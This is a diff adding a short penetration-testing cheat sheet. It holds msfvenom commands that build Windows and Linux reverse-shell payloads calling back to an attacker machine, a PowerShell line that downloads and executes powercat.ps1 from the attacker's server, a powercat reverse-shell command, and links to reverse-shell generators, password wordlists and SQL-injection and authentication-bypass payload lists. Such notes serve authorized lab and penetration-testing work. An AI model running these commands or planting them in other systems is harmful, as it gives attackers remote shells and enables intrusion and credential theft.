@@ -1,0 +1,12 @@
+Windows MSFVenom (MSI):msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali> LPORT=<kaliPort> -f msi -o <filename1>
+Windows MSFVenom (EXE1):msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali> LPORT=<kaliPort> -f exe -o <filename1>
+Windows MSFVenom (EXE2):msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali> LPORT=<kaliPort> -b '\x00\x2f\x0a' -f exe -o <filename1>
+Linux MSFVenom (ELF):msfvenom -p linux/x86/shell_reverse_tcp LHOST=<kali> LPORT=<kaliPort> -f elf > shell.elf
+powercat(file transfer and reverse shell) #remember to attempt base64 or urlencode:IEX (New-Object System.Net.Webclient).DownloadString("http://<kali>:80/powercat.ps1")
+powercat(file transfer and reverse shell) #remember to attempt base64 or urlencode:powercat -c <kali> -p <kaliPort> -e powershell
+^revshell.com:https://www.revshells.com/
+Common Usernames Wordlist:https://gist.github.com/kivox/920c271ef8dec2b33c84e1f2cc2977fc
+Common Passwords Wordlist:/usr/share/wordlists/rockyou.txt
+FastTrack Wordlist:https://github.com/KMGbully/hacksaw/blob/master/wordlists/fasttrack.txt
+SQL Injection Wordlist:https://github.com/PenTestical/sqli/blob/main/hugeSQL.txt
+Auth Bypass Wordlist:https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/exploit/Auth_Bypass.txt
